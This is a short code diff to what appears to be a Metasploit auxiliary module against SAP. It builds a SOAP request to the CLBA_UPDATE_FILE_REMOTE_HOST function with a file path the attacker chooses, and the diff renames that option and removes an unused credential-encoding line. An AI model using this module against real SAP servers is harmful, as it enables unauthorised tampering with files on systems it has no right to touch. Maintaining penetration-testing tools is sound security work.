@@ -66,11 +66,10 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<DATA>a</DATA>'
 		data << '</item>'
 		data << '</DATA_TAB>'
-		data << '<FILE_NAME>' + datastore['PATH'] + '</FILE_NAME>'
+		data << '<FILE_NAME>' + datastore['FILEPATH'] + '</FILE_NAME>'
 		data << '</n1:CLBA_UPDATE_FILE_REMOTE_HOST>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
 		begin
 			vprint_status("[SAP] #{ip}:#{rport} - Sending request for #{datastore['FILEPATH']}")
 			res = send_request_cgi({
